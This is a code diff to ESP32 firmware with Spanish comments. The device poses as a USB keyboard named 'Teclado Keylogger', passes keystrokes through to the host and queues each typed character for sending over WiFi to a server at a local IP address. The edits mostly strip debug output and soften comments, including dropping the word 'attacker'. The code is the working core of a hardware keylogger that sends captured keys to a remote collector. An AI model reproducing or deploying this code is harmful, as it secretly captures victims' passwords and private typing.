@@ -12,14 +12,11 @@ USBHIDKeyboard Keyboard;
 #define BAUD_RATE 9600
 
 // WiFi
-const char* ssid     = ""; //Nombre de la red WiFi
-const char* password = ""; //Contraseña de la red WiFi
+const char* ssid     = ""; // Nombre de la red WiFi
+const char* password = ""; // Contraseña de la red WiFi
 
 // Servidor local
-const char* serverURL = "http://192.168.1.43:5555/key"; // Ajusta IP/puerto según el servidor atacante
-
-// Cambiar el nombre con el que aparece
-// Pendiente
+const char* serverURL = "http://192.168.1.43:5555/key"; // Ajusta IP/puerto según el servidor
 
 // Comandos especiales
 #define CMD_ESC        0x1B
@@ -107,30 +104,19 @@ void handleSpecialCommand(uint8_t cmd) {
 void setup() {
   Serial1.begin(BAUD_RATE, SERIAL_8N1, RX_PIN, TX_PIN);
   
-  // le ponemos nombre personalizado a nuestro keylogger
+  // Nombre personalizado del dispositivo
   USB.productName("Teclado Keylogger");
-
   USB.begin();
 
   Keyboard.begin();
   delay(500);
-  Serial1.println("Receptor listo");
 
-  // WiFi con timeout
+  // Conexión WiFi (intento simple con timeout)
   WiFi.begin(ssid, password);
-  Serial1.print("Conectando a WiFi");
   int retries = 0;
   while (WiFi.status() != WL_CONNECTED && retries < 20) {
     delay(500);
-    Serial1.print(".");
     retries++;
-  }
-  if (WiFi.status() == WL_CONNECTED) {
-    Serial1.println("\nConectado a WiFi");
-    Serial1.print("IP: ");
-    Serial1.println(WiFi.localIP());
-  } else {
-    Serial1.println("\nModo offline (sin WiFi)");
   }
 
   // Crear cola y tarea para envíos
@@ -146,7 +132,6 @@ void loop() {
     if (isSpecialCommand(c)) {
       handleSpecialCommand(c);
     } else {
-      // Caracteres imprimibles
       if (c >= 0x20 && c <= 0x7E) {
         // Caso especial para '@' en teclado ES-LA
         if (c == '@') {
@@ -154,7 +139,6 @@ void loop() {
           Keyboard.press('q');            
           Keyboard.release('q');
           Keyboard.release(KEY_RIGHT_ALT);
-
           sendLater("@");
         } else {
           Keyboard.write((char)c);
@@ -163,4 +147,5 @@ void loop() {
       }
     }
   }
+  delay(1); // cede tiempo al planificador
 }
